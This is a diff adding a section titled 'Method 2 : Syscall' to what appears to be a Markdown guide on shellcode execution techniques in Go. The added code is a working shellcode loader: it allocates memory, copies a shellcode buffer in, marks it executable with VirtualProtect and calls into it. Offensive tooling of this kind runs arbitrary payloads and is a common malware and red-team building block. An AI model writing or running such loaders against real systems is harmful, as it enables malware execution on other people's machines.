@@ -48,5 +48,22 @@ func CreateThread(sc []byte) {
 
 ### Method 2 : Syscall
 
+```go
+func SysCall(sc []byte) {
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
+	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		fmt.Printf("[!] VirutalAlloc : %s", err.Error())
+	}
+	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
+	var oldProtect uint32
+	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
+	if err != nil {
+		panic(fmt.Sprintf("[!] VirtualProtect : %s", err.Error()))
+	}
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+```
 
 ### Method 3 : InjectProcess
